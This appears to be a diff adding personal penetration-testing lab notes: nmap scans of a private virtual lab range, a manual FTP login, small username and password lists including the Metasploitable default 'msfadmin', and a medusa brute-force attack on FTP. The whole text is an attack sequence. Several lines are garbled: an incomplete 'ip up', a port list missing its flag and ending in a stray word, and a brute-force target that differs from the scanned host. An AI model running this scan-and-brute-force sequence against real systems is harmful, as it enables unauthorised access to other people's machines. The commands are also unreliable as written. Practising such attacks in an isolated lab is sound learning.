@@ -1,0 +1,9 @@
+ip up 
+sudo nmap -v -sU 192.168.56.100-110 - 21,22,23,445,3306 para
+ping -c 3 192.168.56.101
+nmap -sV -p 21,22,23,445,139 192.168.56.101 
+ftp 192.168.56.101
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
+ftp 192.168.56.101
